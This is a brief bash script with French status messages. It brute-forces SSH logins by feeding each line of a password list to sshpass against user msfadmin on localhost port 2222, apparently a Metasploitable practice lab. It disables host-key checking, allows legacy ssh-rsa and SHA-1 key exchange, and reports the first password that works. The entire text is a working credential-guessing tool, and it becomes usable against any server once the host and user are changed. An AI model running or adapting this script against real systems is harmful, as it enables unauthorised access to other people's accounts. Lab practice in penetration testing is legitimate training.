#!/usr/bin/env bash
while read -r pass; do
  [[ -z "$pass" ]] && continue
  echo -n "[$(date +%T)] Test : $pass ... "
  result=$(timeout 15 sshpass -p "$pass" ssh -n -p 2222 \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
    -o "HostKeyAlgorithms=+ssh-rsa" \
    -o "KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1" \
    msfadmin@127.0.0.1 "echo CONNEXION_REUSSIE" 2>/dev/null)
  if echo "$result" | grep -q "CONNEXION_REUSSIE"; then
    echo "TROUVE"
    echo ">>> MOT DE PASSE : $pass"
    break
  else
    echo "échec (ou timeout)"
  fi
  sleep 2
done < passwords.txt
